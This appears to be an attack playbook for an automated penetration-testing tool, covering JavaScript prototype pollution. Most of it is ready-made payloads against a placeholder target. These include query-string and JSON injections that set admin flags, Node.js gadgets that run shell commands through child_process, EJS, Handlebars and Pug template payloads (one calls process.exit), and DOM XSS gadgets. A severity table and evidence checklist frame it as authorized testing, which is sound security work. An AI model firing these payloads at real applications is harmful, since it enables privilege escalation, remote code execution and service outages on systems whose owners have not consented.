---
name: attack-prototype-pollution
description: "JavaScript prototype pollution — __proto__ injection, constructor.prototype, gadget chain exploitation"
category: "web-application"
version: "1.0"
author: "cyberstrike-official"
tags:
  - prototype-pollution
  - javascript
  - web
  - xss
  - attack
tech_stack:
  - javascript
  - nodejs
  - web
cwe_ids:
  - CWE-1321
chains_with:
  - attack-ssti
prerequisites: []
severity_boost:
  attack-ssti: "Prototype pollution → SSTI gadgets = RCE"
---

# Prototype Pollution

## Objective

Exploit JavaScript prototype pollution to modify Object.prototype, leading to XSS, privilege escalation, or RCE via gadget chains.

## Testing Methodology

### Phase 1: Client-Side Detection

**URL-based pollution:**
```
https://TARGET/?__proto__[polluted]=1
https://TARGET/?__proto__.polluted=1
https://TARGET/?constructor[prototype][polluted]=1
https://TARGET/#__proto__[polluted]=1
```

Verify in browser console:
```javascript
console.log(({}).polluted) // Should print "1" if vulnerable
```

### Phase 2: JSON Body Pollution

```bash
# Merge/patch endpoints
curl -X POST https://TARGET/api/settings \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"isAdmin": true}}'

curl -X PATCH https://TARGET/api/user/profile \
  -d '{"constructor": {"prototype": {"role": "admin"}}}'

# Nested object merge
curl -X PUT https://TARGET/api/config \
  -d '{"a": {"__proto__": {"polluted": true}}}'
```

### Phase 3: Server-Side Detection (Node.js)

```bash
# RCE via child_process gadget
curl -X POST https://TARGET/api/merge \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"shell": "/proc/self/exe", "argv0": "console.log(require(\"child_process\").execSync(\"id\").toString())", "NODE_OPTIONS": "--require /proc/self/cmdline"}}'

# EJS template gadget
curl -X POST https://TARGET/api/settings \
  -d '{"__proto__": {"outputFunctionName": "x;process.mainModule.require(\"child_process\").execSync(\"id\");s"}}'

# Handlebars gadget
curl -X POST https://TARGET/api/settings \
  -d '{"__proto__": {"type": "Program", "body": [{"type": "MustacheStatement", "params": [], "path": {"type": "PathExpression", "original": "constructor"}}]}}'
```

### Phase 4: Client-Side Gadgets

Common DOM gadgets when `Object.prototype` is polluted:

```javascript
// innerHTML gadget
Object.prototype.innerHTML = '<img src=x onerror=alert(1)>'

// src gadget
Object.prototype.src = 'javascript:alert(1)'

// href gadget
Object.prototype.href = 'javascript:alert(1)'

// data-* attributes
Object.prototype['data-tooltip'] = '<img src=x onerror=alert(1)>'
```

### Phase 5: Framework-Specific

**Express.js / Pug:**
```json
{"__proto__": {"block": {"type": "Text", "val": "x]));process.exit()//"}}}
```

**Lodash merge:**
```json
{"__proto__": {"polluted": true}}
```

## What Constitutes a Finding

| Finding | Severity |
|---------|----------|
| Server-side RCE via prototype pollution gadget | Critical (P1) |
| Privilege escalation (isAdmin=true) | Critical (P1) |
| Client-side XSS via DOM gadget | High (P2) |
| Prototype pollution without known gadget | Medium (P3) |

## Evidence Requirements

- Endpoint accepting merge/deep-copy of user input
- Payload sent (__proto__ or constructor.prototype)
- Proof of pollution (new property on empty object)
- For RCE: command output
- For XSS: JavaScript execution proof

## References

- [PortSwigger: Prototype Pollution](https://portswigger.net/web-security/prototype-pollution)
- [Server-Side Prototype Pollution](https://portswigger.net/research/server-side-prototype-pollution)
